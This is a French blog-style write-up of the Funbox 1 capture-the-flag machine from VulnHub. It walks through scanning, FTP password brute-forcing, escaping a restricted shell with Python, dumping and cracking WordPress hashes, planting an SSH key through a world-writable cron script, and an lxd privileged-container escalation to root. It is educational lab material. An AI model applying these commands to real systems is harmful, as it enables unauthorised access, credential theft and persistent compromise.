---
title: Solution du CTF Funbox 1 de VulnHub
tags: [CTF, VulnHub]
---

### BlueBox

[Funbox: 1](https://vulnhub.com/entry/funbox-1,518/) est un CTF sympa (d'où le nom). Plus sérieusement, c'est le premier opus d'une série de CTFs dont j'ignorais l'existence.

Il se veut réaliste, ce qui donne une bouffée d'air par rapport à des CTFs improbables comme *Teuchter Twa*.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.120
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.120
Host is up (0.000096s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
--- snip ---
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: joe
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
--- snip ---
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /secret/: Potentially interesting folder
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: 08:00:27:18:41:DA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.32 seconds
```

J'ai longuement énuméré `/secret/` m'ai je n'en ai rien tiré.

Sur le blog Wordpress (qui fait référence au nom d'hôte `funbox.fritz.box`), dans le post par défaut `Hello world!`, on trouve des commentaires HTML avec du contenu base64. Une fois décodés ils nous incitent à rester "dans la réalité".

On va donc lancer un `wpscan` :

```console
$ docker run --add-host funbox.fritz.box:192.168.56.120 -it --rm wpscanteam/wpscan --url http://funbox.fritz.box/ -e ap,at,u --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://funbox.fritz.box/ [192.168.56.120]

Interesting Finding(s):

--- snip ---

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://funbox.fritz.box/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:58 <============================================================================================================================> (111404 / 111404) 100.00% Time: 00:02:58
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://funbox.fritz.box/wp-content/plugins/akismet/
 | Last Updated: 2025-05-07T16:30:00.000Z
 | Readme: http://funbox.fritz.box/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://funbox.fritz.box/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.6 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://funbox.fritz.box/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://funbox.fritz.box/wp-content/plugins/akismet/readme.txt

[+] hello-dolly
 | Location: http://funbox.fritz.box/wp-content/plugins/hello-dolly/
 | Latest Version: 1.7.2 (up to date)
 | Last Updated: 2025-05-07T16:50:00.000Z
 | Readme: http://funbox.fritz.box/wp-content/plugins/hello-dolly/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://funbox.fritz.box/wp-content/plugins/hello-dolly/, status: 200
 |
 | Version: 1.7.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://funbox.fritz.box/wp-content/plugins/hello-dolly/readme.txt

--- snip ---

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

--- snip ---
```

Il ne semble pas y avoir de plugins vulnérables. On se concentre alors sur les utilisateurs.

Il y a un service FTP sur le serveur, on se dit que ce n'est pas pour les chiens.

```console
$ ncrack -f -U users.txt -P wordlists/rockyou.txt ftp://192.168.56.120

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ftp on 192.168.56.120 21/tcp:
192.168.56.120 21/tcp ftp: 'joe' '12345'

Ncrack done: 1 service scanned in 4.33 seconds.

Ncrack finished.
```

### PastaBox

Les identifiants sont acceptés sur SSH :

```console
joe@funbox:~$ id
uid=1001(joe) gid=1001(joe) groups=1001(joe)
joe@funbox:~$ sudo -l
[sudo] password for joe: 
Sorry, user joe may not run sudo on funbox.
joe@funbox:~$ ls -al
total 56
drwxr-xr-x 5 joe  joe  4096 Jul 18  2020 .
drwxr-xr-x 4 root root 4096 Jun 19  2020 ..
-rw------- 1 joe  joe  1141 Jul 18  2020 .bash_history
-rw-r--r-- 1 joe  joe   220 Jun 19  2020 .bash_logout
-rw-r--r-- 1 joe  joe  3771 Jun 19  2020 .bashrc
drwx------ 2 joe  joe  4096 Jun 19  2020 .cache
drwxrwxr-x 3 joe  joe  4096 Jul 18  2020 .local
-rw------- 1 joe  joe   260 Jun 22  2020 .mysql_history
-rw-r--r-- 1 joe  joe   807 Jun 19  2020 .profile
drwx------ 2 joe  joe  4096 Jun 22  2020 .ssh
-rw------- 1 joe  joe  9549 Jul 18  2020 .viminfo
-rw------- 1 joe  joe   998 Jul 18  2020 mbox
```

Après quelques commandes, on comprends que l'on est dans un restricted bash.

```console
joe@funbox:~$ env
SHELL=/bin/rbash
--- snip ---
```

Il n'a pas l'air bien costaud dans sa configuration. On le bypass simplement en appelant bash depuis un autre exécutable :

```console
joe@funbox:~$ python3
Python 3.8.2
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pty
>>> pty.spawn("/bin/bash")
joe@funbox:~$
```

Je passe ensuite à l'énumération locale.

```console
joe@funbox:/var/www/html$ grep DB wp-config.php 
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'wordpress');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');
joe@funbox:/var/www/html$ mysql -u wordpress -p wordpress
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 153
Server version: 8.0.20-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 | admin         | funny@funbox.box |          | 2020-06-19 11:32:16 |                                               |           0 | admin        |
|  2 | joe        | $P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1 | joe           | joe@funbox.box   |          | 2020-06-19 11:46:42 | 1592567203:$P$B7eKG/1s3GPGXCUM/h.lmWqaZ2Udvq1 |           0 | joe miller   |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+
2 rows in set (0.00 sec)
```

Le hash trouvé pour `admin` se casse vite, mais ne semble d'aucune utilité.

```console
$ john --wordlist=wordlists/rockyou.txt /tmp/hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 13 [worst case UTF-8] to 39 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
iubire           (admin)     
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Il y a un autre utilisateur sur le système. Il dispose notamment d'un script world-writable :

```console
joe@funbox:/var/www/html$ find / -user funny -ls 2> /dev/null 
   533886      4 drwxr-xr-x   3 funny    funny        4096 Jul 18  2020 /home/funny
   536659      4 -rwxrwxrwx   1 funny    funny          55 Jul 18  2020 /home/funny/.backup.sh
   533571  47560 -rw-rw-r--   1 funny    funny    48701440 Jul  1 14:08 /home/funny/html.tar
   533887      4 -rw-r--r--   1 funny    funny         220 Feb 25  2020 /home/funny/.bash_logout
   534005      0 -rw-r--r--   1 funny    funny           0 Jun 19  2020 /home/funny/.sudo_as_admin_successful
   536657      4 -rw-rw-r--   1 funny    funny          74 Jun 19  2020 /home/funny/.selected_editor
   533888      4 -rw-r--r--   1 funny    funny        3771 Feb 25  2020 /home/funny/.bashrc
   541032      8 -rw-------   1 funny    funny        7791 Jul 18  2020 /home/funny/.viminfo
   533889      4 -rw-r--r--   1 funny    funny         807 Feb 25  2020 /home/funny/.profile
   534003      4 drwx------   2 funny    funny        4096 Jun 19  2020 /home/funny/.cache
   537275      4 -rw-rw-r--   1 funny    funny         162 Jun 19  2020 /home/funny/.reminder.sh
   535277      4 -rw-------   1 funny    funny        1462 Jul 18  2020 /home/funny/.bash_history
     2397    516 -rw-------   1 funny    mail       520450 Jul  1 14:08 /var/mail/funny
```

Quant à l'archive tar, elle correspond à un backup de `/var/www/html/`. On remarque que le fichier est récent, donc une tâche CRON est à l'œuvre.

La source la voilà :

```console
joe@funbox:/var/www/html$ cat /home/funny/.backup.sh
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
joe@funbox:/var/www/html$ cat /home/funny/.reminder.sh
#!/bin/bash
echo "Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run." | mail -s"Reminder" joe@funbox
```

Je modifie donc le fichier `.backup.sh` :

```bash
#!/bin/bash
mkdir -p /home/funny/.ssh
echo "ssh-rsa AAAAB3N--- snip ---V7Ez8/h" >> /home/funny/.ssh/authorized_keys
```

J'attends un peu et je peux désormais me connecter avec `funny`.

### FunnyBox

L'utilisateur fait partie du groupe `lxd`. Ce n'est pas la première fois que je croise ce scénario d'escalade de privilèges. Par exemple :

- [Aloha de Wizard Labs]({% link _posts/2020-11-17-Solution-du-CTF-Aloha-de-Wizard-Labs.md %})

- [Prime 2 de VulnHub]({% link _posts/2021-12-13-Solution-du-CTF-Prime-2-de-VulnHub.md %})

- [Chatty Katty de iamv1nc3nt]({% link _posts/2022-02-11-Solution-du-CTF-ChattyKathy-de-iamv1nc3nt.md %})

- [Djinn 2 de VulnHub]({% link _posts/2022-11-25-Solution-du-CTF-Djinn-2-de-VulnHub.md %})

- [Wireless de VulnHub]({% link _posts/2023-02-16-Solution-du-CTF-Wireless-de-VulnHub.md %})

En général une image `lxc` est déjà présente sur le système, mais là ce n'est pas le cas. Dans tous les cas, on peut suivre la procédure expliquée sur [HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html) et récupérer des images toutes faites sur https://images.lxd.canonical.com/.

Ici, je mets en place le container alpine avec les deux archives `.tar.xz` récupérées sur `Canonical`. J'ai dû aussi appeler `lxc init` pour résoudre le problème de `storage pool` :

```console
funny@funbox:~$ wget http://192.168.56.1/lxd.tar.xz
--2025-07-01 12:11:49--  http://192.168.56.1/lxd.tar.xz
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 920 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz                                           100%[====================================================================================================================>]     920  --.-KB/s    in 0s      

2025-07-01 12:11:49 (90.2 MB/s) - ‘lxd.tar.xz’ saved [920/920]

funny@funbox:~$ wget http://192.168.56.1/rootfs.squashfs
--2025-07-01 12:12:05--  http://192.168.56.1/rootfs.squashfs
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3076096 (2.9M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs                                      100%[====================================================================================================================>]   2.93M  --.-KB/s    in 0.03s   

2025-07-01 12:12:05 (106 MB/s) - ‘rootfs.squashfs’ saved [3076096/3076096]

funny@funbox:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 2fc27f766cb844e49265a99bbbb53217b3f60843731cf9587bb07fff938a3b72
funny@funbox:~$ lxc image list
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+-----------------------------+
| alpine | 2fc27f766cb8 | no     | Alpinelinux 3.19 x86_64 (20250701_0017) | x86_64       | CONTAINER | 2.93MB | Jul 1, 2025 at 13:12pm (UTC) |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+-----------------------------+
funny@funbox:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
Error: No storage pool found. Please create a new storage pool
funny@funbox:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty disk or partition? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
funny@funbox:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Error: Image with same fingerprint already exists
funny@funbox:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
funny@funbox:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

Une fois le container prêt, je le lance en montant la racine du disque :

```console
funny@funbox:~$ lxc start privesc
funny@funbox:~$ lxc exec privesc /bin/sh
~ # cd /mnt/root
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        swap.img    tmp         var
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         sys         usr
/mnt/root # cd root/
/mnt/root/root # ls
flag.txt  mbox      snap
/mnt/root/root # cat flag.txt 
Great ! You did it...
FUNBOX - made by @0815R2d2
```
